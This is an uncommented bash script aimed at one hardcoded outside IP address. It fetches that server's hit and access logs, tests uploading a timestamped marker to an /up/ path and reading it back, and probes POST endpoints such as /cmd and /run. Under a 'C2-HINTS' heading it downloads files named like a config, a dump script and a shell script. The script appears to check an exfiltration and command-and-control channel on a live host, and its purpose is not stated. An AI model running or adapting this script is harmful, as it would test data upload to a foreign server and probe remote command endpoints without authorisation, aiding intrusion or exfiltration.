#!/bin/bash
set +e
H=123.184.7.135
log(){ echo "$@"; }
log "### GV8 $(date -u +%FT%TZ)"
g(){ echo "===== $1"; timeout 10 curl -s "$1" | tail -c "${2:-3000}"; echo; }
g "http://$H:8099/hits.log" 3000
g "http://$H:8099/access.log" 4000
g "http://$H:8099/.seq" 100
log "### POST-UP-TEST"
TS=$(date +%s)
timeout 10 curl -s -o /tmp/p1 -w 'post-up %{http_code} %{size_download}\n' -X POST --data-binary "UL5817_MARKER_$TS" "http://$H:8099/up/ul5817_$TS.txt"; cat /tmp/p1; echo
timeout 10 curl -s -o /tmp/p2 -w 'get-back %{http_code} %{size_download}\n' "http://$H:8099/ul5817_$TS.txt"; cat /tmp/p2; echo
log "### POST-OTHER-PATHS"
for P in "/up/" "/upload" "/api/up" "/cmd" "/run" "/put"; do
  R=$(timeout 8 curl -s -o /tmp/p3 -w '%{http_code}' -X POST --data-binary "x" "http://$H:8099$P"); echo "POST $P -> $R"; head -c 150 /tmp/p3; echo
done
log "### C2-HINTS"
g "http://$H:8099/i6821_cfg.txt" 3000
g "http://$H:8099/i6821_dump.py" 2500
g "http://$H:8099/diag17.sh" 2500
log "### DONE8"
